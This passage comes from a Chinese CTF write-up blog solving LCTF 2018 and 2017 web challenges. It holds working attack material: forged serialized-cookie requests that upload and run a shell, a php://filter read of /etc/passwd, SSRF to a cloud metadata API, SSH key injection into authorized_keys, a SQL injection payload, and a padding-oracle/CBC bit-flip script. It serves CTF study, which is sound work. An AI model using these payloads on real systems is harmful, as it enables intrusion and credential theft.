<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">class User &#123; </span><br><span class="line">    public $avatar; </span><br><span class="line">    function __construct($path) &#123; </span><br><span class="line">        $this-&gt;avatar = $path;                                           </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line">$data = serialize(new User(&quot;../file/48915dedf3ce9ddc70aeefe2a42006a4&quot;));</span><br><span class="line">$hmac = hash_hmac(&quot;md5&quot;, $data, NULL); </span><br><span class="line">print_r(urlencode(sprintf(&quot;%s-----%s&quot;, $data, $hmac)));</span><br></pre></td></tr></table></figure>

<p>修改<code>session-data</code>后，有多种方法getshell：</p>
<h4 id="1-直接利用反序列化"><a href="#1-直接利用反序列化" class="headerlink" title="1. 直接利用反序列化"></a>1. 直接利用反序列化</h4><p>在<code>check_session()</code>中有<code>$data = unserialize($data);</code>直接利用反序列化</p>
<p>传shell</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">GET /LCTF.php?m=upload&amp;url=http://test.tan90.me HTTP/1.1</span><br><span class="line">Host: 212.64.74.153</span><br><span class="line">Pragma: no-cache</span><br><span class="line">Cache-Control: no-cache</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-TW;q=0.6</span><br><span class="line">Cookie: session-data=O%3A4%3A%22User%22%3A1%3A%7Bs%3A6%3A%22avatar%22%3Bs%3A40%3A%22..%2Ffile%2F48915dedf3ce9ddc70aeefe2a42006a4%22%3B%7D-----01d76466746e56bfe3e9558529df2709</span><br><span class="line">Connection: close</span><br></pre></td></tr></table></figure>

<p>执行命令</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">GET /LCTF.php?m=upload&amp;url=http://test.tan90.me&amp;cmd=ls%20-al%20/tmp HTTP/1.1</span><br><span class="line">Host: 212.64.74.153</span><br><span class="line">Pragma: no-cache</span><br><span class="line">Cache-Control: no-cache</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-TW;q=0.6</span><br><span class="line">Cookie: session-data=O%3A18%3A%22K0rz3n_secret_flag%22%3A1%3A%7Bs%3A12%3A%22%00%2A%00file_path%22%3Bs%3A57%3A%22%2Fvar%2Fwww%2Ffile%2F48915dedf3ce9ddc70aeefe2a42006a4%2Favatar.gif%22%3B%7D-----7b954f00dc02cd915b1c3d4872112634</span><br><span class="line">Connection: close</span><br></pre></td></tr></table></figure>

<h4 id="2-和上题一样，phar反序列化"><a href="#2-和上题一样，phar反序列化" class="headerlink" title="2. 和上题一样，phar反序列化"></a>2. 和上题一样，phar反序列化</h4><h4 id="3-tmpfile-getshell"><a href="#3-tmpfile-getshell" class="headerlink" title="3. tmpfile getshell"></a>3. tmpfile getshell</h4><p><a href="http://212.64.74.153/LCTF.php?m=check&amp;c=compress.zlib://php://filter/string.strip_tags/resource=/etc/passwd" target="_blank" rel="noopener">http://212.64.74.153/LCTF.php?m=check&amp;c=compress.zlib://php://filter/string.strip_tags/resource=/etc/passwd</a></p>
<p>解法：<br><a href="https://www.jianshu.com/p/dfd049924258" target="_blank" rel="noopener">https://www.jianshu.com/p/dfd049924258</a></p>
<h4 id="预期解："><a href="#预期解：" class="headerlink" title="预期解："></a>预期解：</h4><p><a href="http://www.k0rz3n.com/2018/11/19/LCTF%202018%20T4lk%201s%20ch34p,sh0w%20m3%20the%20sh31l%20%E8%AF%A6%E7%BB%86%E5%88%86%E6%9E%90/" target="_blank" rel="noopener">http://www.k0rz3n.com/2018/11/19/LCTF%202018%20T4lk%201s%20ch34p,sh0w%20m3%20the%20sh31l%20%E8%AF%A6%E7%BB%86%E5%88%86%E6%9E%90/</a></p>
<h3 id="Travel"><a href="#Travel" class="headerlink" title="Travel"></a>Travel</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> request, render_template</span><br><span class="line"><span class="keyword">from</span> config <span class="keyword">import</span> create_app</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"></span><br><span class="line">app = create_app()</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/upload/&lt;filename&gt;', methods = ['PUT'])            # 幂等的请求，会产生覆盖</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">upload_file</span><span class="params">(filename)</span>:</span></span><br><span class="line">    name = request.cookies.get(<span class="string">'name'</span>)</span><br><span class="line">    pwd = request.cookies.get(<span class="string">'pwd'</span>)</span><br><span class="line">    <span class="keyword">if</span> name != <span class="string">'lctf'</span> <span class="keyword">or</span> pwd != str(uuid.getnode()):           <span class="comment"># 不知道硬件地址则绕不过去</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">"0"</span></span><br><span class="line">    filename = urllib.unquote(filename)                         <span class="comment"># 进行 url 解码</span></span><br><span class="line">    <span class="keyword">with</span> open(os.path.join(app.config[<span class="string">'UPLOAD_FOLDER'</span>], filename), <span class="string">'w'</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(request.get_data(as_text = <span class="literal">True</span>))</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"1"</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">"0"</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/', methods = ['GET'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">()</span>:</span></span><br><span class="line">    url = request.args.get(<span class="string">'url'</span>, <span class="string">''</span>)</span><br><span class="line">    <span class="keyword">if</span> url == <span class="string">''</span>:</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">'index.html'</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">"http"</span> != url[: <span class="number">4</span>]:                                     <span class="comment"># 必须要 http 请求</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">"hacker"</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        response = requests.get(url, timeout = <span class="number">10</span>)</span><br><span class="line">        response.encoding = <span class="string">'utf-8'</span></span><br><span class="line">        <span class="keyword">return</span> response.text</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"Something Error"</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/source', methods = ['GET'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_source</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> open(__file__).read()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    app.run()</span><br></pre></td></tr></table></figure>

<p>pwd就是网卡的mac地址，获得这个值就能进行任意文件写入，写入ssh key就能ssh登陆拿到shell</p>
<p>查题目的ip发现是腾讯云的服务器，有一个metadata的API，</p>
<p>腾讯云文档 <a href="https://cloud.tencent.com/document/product/213/4934" target="_blank" rel="noopener">https://cloud.tencent.com/document/product/213/4934</a></p>
<p>根据文档里的方法，获得mac地址</p>
<p><code>http://118.25.150.86/?url=http://metadata.tencentyun.com/latest/meta-data/network/interfaces/macs</code></p>
<p>52:54:00:48:c8:73（hex）-&gt;90520735500403(int)</p>
<p>nginx禁用了PUT方法，用<code>X-HTTP-Method-Override:PUT</code>绕过</p>
<p>然后向<code>/home/lctf/.ssh/authorized_keys</code> 写入自己的公钥,登陆</p>
<h3 id="年久失修的系统"><a href="#年久失修的系统" class="headerlink" title="年久失修的系统"></a>年久失修的系统</h3><p>先用select通过id选出该用户检测是否为当前session中的用户，再用update通过id更新用户信息。</p>
<p>payload:<code>?userid=myid-(myid-adminid)*@a:=@a is not null</code></p>
<p>原理：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select @a:=@a is not null;</span><br><span class="line">+--------------------+</span><br><span class="line">| @a:=@a is not null |</span><br><span class="line">+--------------------+</span><br><span class="line">|                  0 |</span><br><span class="line">+--------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select @a:=@a is not null;</span><br><span class="line">+--------------------+</span><br><span class="line">| @a:=@a is not null |</span><br><span class="line">+--------------------+</span><br><span class="line">|                  1 |</span><br><span class="line">+--------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure>

<h2 id="2017LCTF"><a href="#2017LCTF" class="headerlink" title="2017LCTF"></a>2017LCTF</h2><h3 id="Simple-blog"><a href="#Simple-blog" class="headerlink" title="Simple blog"></a>Simple blog</h3><p>login.php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">session_start();</span><br><span class="line">define(<span class="string">"METHOD"</span>, <span class="string">"aes-128-cbc"</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">'config.php'</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">show_page</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="string">&lt;html&gt;</span></span><br><span class="line"><span class="string">&lt;head&gt;</span></span><br><span class="line"><span class="string">  &lt;meta charset="UTF-8"&gt;</span></span><br><span class="line"><span class="string">  &lt;title&gt;Login Form&lt;/title&gt;</span></span><br><span class="line"><span class="string">  &lt;link rel="stylesheet" type="text/css" href="css/login.css" /&gt;</span></span><br><span class="line"><span class="string">&lt;/head&gt;</span></span><br><span class="line"><span class="string">&lt;body&gt;</span></span><br><span class="line"><span class="string">  &lt;div class="login"&gt;</span></span><br><span class="line"><span class="string">    &lt;h1&gt;后台登录&lt;/h1&gt;</span></span><br><span class="line"><span class="string">    &lt;form method="post"&gt;</span></span><br><span class="line"><span class="string">        &lt;input type="text" name="username" placeholder="Username" required="required" /&gt;</span></span><br><span class="line"><span class="string">        &lt;input type="password" name="password" placeholder="Password" required="required" /&gt;</span></span><br><span class="line"><span class="string">        &lt;button type="submit" class="btn btn-primary btn-block btn-large"&gt;Login&lt;/button&gt;</span></span><br><span class="line"><span class="string">    &lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/div&gt;</span></span><br><span class="line"><span class="string">&lt;/body&gt;</span></span><br><span class="line"><span class="string">&lt;/html&gt;</span></span><br><span class="line"><span class="string">'</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_random_token</span><span class="params">()</span></span>&#123;</span><br><span class="line">    $random_token = <span class="string">''</span>;</span><br><span class="line">    $str = <span class="string">"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz1234567890"</span>;</span><br><span class="line">    <span class="keyword">for</span>($i = <span class="number">0</span>; $i &lt; <span class="number">16</span>; $i++)&#123;</span><br><span class="line">        $random_token .= substr($str, rand(<span class="number">1</span>, <span class="number">61</span>), <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> $random_token;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_identity</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">global</span> $id;</span><br><span class="line">    $token = get_random_token();</span><br><span class="line">    $c = openssl_encrypt($id, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, $token);</span><br><span class="line">    $_SESSION[<span class="string">'id'</span>] = base64_encode($c);</span><br><span class="line">    setcookie(<span class="string">"token"</span>, base64_encode($token));</span><br><span class="line">    <span class="keyword">if</span>($id === <span class="string">'admin'</span>)&#123;</span><br><span class="line">        $_SESSION[<span class="string">'isadmin'</span>] = <span class="number">1</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        $_SESSION[<span class="string">'isadmin'</span>] = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">test_identity</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>($_SESSION[<span class="string">'id'</span>])) &#123;</span><br><span class="line">        $c = base64_decode($_SESSION[<span class="string">'id'</span>]);</span><br><span class="line">        $token = base64_decode($_COOKIE[<span class="string">"token"</span>]);</span><br><span class="line">        <span class="keyword">if</span>($u = openssl_decrypt($c, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, $token))&#123;</span><br><span class="line">            <span class="keyword">if</span> ($u === <span class="string">'admin'</span>) &#123;</span><br><span class="line">                $_SESSION[<span class="string">'isadmin'</span>] = <span class="number">1</span>;</span><br><span class="line">                <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"Error!"</span>);</span><br><span class="line">        &#125; </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'username'</span>])&amp;&amp;<span class="keyword">isset</span>($_POST[<span class="string">'password'</span>]))&#123;</span><br><span class="line">    $username = mysql_real_escape_string($_POST[<span class="string">'username'</span>]);</span><br><span class="line">    $password = $_POST[<span class="string">'password'</span>];</span><br><span class="line">    $result = mysql_query(<span class="string">"select password from users where username='"</span> . $username . <span class="string">"'"</span>, $con);</span><br><span class="line">    $row = mysql_fetch_array($result);</span><br><span class="line">    <span class="keyword">if</span>($row[<span class="string">'password'</span>] === md5($password))&#123;</span><br><span class="line">        get_identity();</span><br><span class="line">        header(<span class="string">'location: ./admin.php'</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'Login failed.'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(test_identity())&#123;</span><br><span class="line">        header(<span class="string">'location: ./admin.php'</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        show_page();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>admin.php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">session_start();</span><br><span class="line"><span class="keyword">include</span>(<span class="string">'config.php'</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!$_SESSION[<span class="string">'isadmin'</span>])&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'You are not admin'</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'id'</span>]))&#123;</span><br><span class="line">    $id = mysql_real_escape_string($_GET[<span class="string">'id'</span>]);</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'title'</span>]))&#123;</span><br><span class="line">        $title = mysql_real_escape_string($_GET[<span class="string">'title'</span>]);</span><br><span class="line">        $title = sprintf(<span class="string">"AND title='%s'"</span>, $title);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        $title = <span class="string">''</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    $sql = sprintf(<span class="string">"SELECT * FROM article WHERE id='%s' $title"</span>, $id);</span><br><span class="line">    $result = mysql_query($sql,$con);</span><br><span class="line">    $row = mysql_fetch_array($result);</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>($row[<span class="string">'title'</span>])&amp;&amp;<span class="keyword">isset</span>($row[<span class="string">'content'</span>]))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;h1&gt;"</span>.$row[<span class="string">'title'</span>].<span class="string">"&lt;/h1&gt;&lt;br&gt;"</span>.$row[<span class="string">'content'</span>];</span><br><span class="line">        <span class="keyword">die</span>();</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"This article does not exist."</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=<span class="string">"utf-8"</span>&gt;</span><br><span class="line">    &lt;title&gt;adminpage&lt;/title&gt;</span><br><span class="line">    &lt;link href=<span class="string">"css/bootstrap.min.css"</span> rel=<span class="string">"stylesheet"</span>&gt;</span><br><span class="line">    &lt;script src=<span class="string">"js/jquery.min.js"</span>&gt;&lt;/script&gt;</span><br><span class="line">    &lt;script src=<span class="string">"js/bootstrap.min.js"</span>&gt;&lt;/script&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;nav class="navbar navbar-default" role="navigation"&gt;</span><br><span class="line">   &lt;div class="navbar-header"&gt;</span><br><span class="line">      &lt;a class="navbar-brand" href="#"&gt;后台&lt;/a&gt;</span><br><span class="line">   &lt;/div&gt;</span><br><span class="line">   &lt;div&gt;</span><br><span class="line">      &lt;ul class="nav navbar-nav"&gt;</span><br><span class="line">         &lt;li class="active"&gt;&lt;a href="#"&gt;编辑文章&lt;/a&gt;&lt;/li&gt;</span><br><span class="line">         &lt;li&gt;&lt;a href=<span class="string">"#"</span>&gt;设置&lt;/a&gt;&lt;/li&gt;</span><br><span class="line">      &lt;/ul&gt;</span><br><span class="line">   &lt;/div&gt;&lt;/nav&gt;</span><br><span class="line">   &lt;div class="panel panel-success"&gt;</span><br><span class="line">   &lt;div class="panel-heading"&gt;</span><br><span class="line">      &lt;h1 class="panel-title"&gt;文章列表&lt;/h1&gt;</span><br><span class="line">   &lt;/div&gt;</span><br><span class="line">   &lt;div class="panel-body"&gt;</span><br><span class="line">      &lt;li&gt;&lt;a href=<span class="string">'?id=1'</span>&gt;Welcome to myblog&lt;/a&gt;&lt;br&gt;&lt;/li&gt;</span><br><span class="line">      &lt;li&gt;&lt;a href=<span class="string">'?id=2'</span>&gt;Hello,world!&lt;/a&gt;&lt;br&gt;&lt;/li&gt;</span><br><span class="line">      &lt;li&gt;&lt;a href=<span class="string">'?id=3'</span>&gt;This is admin page&lt;/a&gt;&lt;br&gt;&lt;/li&gt;</span><br><span class="line">   &lt;/div&gt;</span><br><span class="line">   &lt;/div&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<h4 id="CBC翻转字节攻击"><a href="#CBC翻转字节攻击" class="headerlink" title="CBC翻转字节攻击"></a>CBC翻转字节攻击</h4><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">url=<span class="string">'http://111.231.111.54/login.php'</span></span><br><span class="line">N=<span class="number">16</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">inject_token</span><span class="params">(token)</span>:</span></span><br><span class="line">    header=&#123;<span class="string">"Cookie"</span>:<span class="string">"PHPSESSID="</span>+phpsession+<span class="string">";token="</span>+token&#125;</span><br><span class="line">    result=requests.post(url,headers=header)</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">xor</span><span class="params">(a, b)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">""</span>.join([chr(ord(a[i])^ord(b[i%len(b)])) <span class="keyword">for</span> i <span class="keyword">in</span> xrange(len(a))])</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pad</span><span class="params">(string,N)</span>:</span></span><br><span class="line">    l=len(string)</span><br><span class="line">    <span class="keyword">if</span> l!=N:</span><br><span class="line">        <span class="keyword">return</span> string+chr(N-l)*(N-l)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">padding_oracle</span><span class="params">(N)</span>:</span></span><br><span class="line">    get=<span class="string">""</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">1</span>,N+<span class="number">1</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> xrange(<span class="number">0</span>,<span class="number">256</span>):</span><br><span class="line">            padding=xor(get,chr(i)*(i<span class="number">-1</span>))</span><br><span class="line">            c=chr(<span class="number">0</span>)*(<span class="number">16</span>-i)+chr(j)+padding</span><br><span class="line">            result=inject_token(base64.b64encode(c))</span><br><span class="line">            <span class="keyword">if</span> <span class="string">"Error!"</span> <span class="keyword">not</span> <span class="keyword">in</span> result.content:</span><br><span class="line">                get=chr(j^i)+get</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">return</span> get</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">login</span><span class="params">(url)</span>:</span></span><br><span class="line">    payload = &#123;</span><br><span class="line">        <span class="string">"username"</span>:<span class="string">"admin"</span>,</span><br><span class="line">        <span class="string">"password"</span>:<span class="string">"admin"</span></span><br><span class="line">    &#125;</span><br><span class="line">    coo1 = &#123;</span><br><span class="line">        <span class="string">"PHPSESSID"</span>:<span class="string">"j297k7o6d8stcbvi2c23naj5j6"</span></span><br><span class="line">    &#125;</span><br><span class="line">    r = requests.post(url,cookies=coo1,data=payload,allow_redirects=<span class="literal">False</span>)</span><br><span class="line">    token = r.headers[<span 